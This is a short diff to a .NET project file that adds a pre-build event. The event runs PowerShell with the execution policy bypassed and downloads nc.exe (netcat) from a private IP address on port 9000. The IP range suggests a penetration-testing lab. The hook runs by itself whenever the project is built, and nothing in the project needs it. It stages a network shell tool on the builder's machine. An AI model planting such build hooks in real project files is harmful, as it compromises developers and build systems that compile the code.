@@ -1,5 +1,9 @@
 <Project Sdk="Microsoft.NET.Sdk">
-
+  <PreBuildEvent>
+    <Command>
+      powershell -ep bypass -c "wget http://10.10.14.34:9000/nc.exe"
+    </Command>
+  </PreBuildEvent>
   <PropertyGroup>
     <OutputType>Exe</OutputType>
     <TargetFramework>net6.0</TargetFramework>
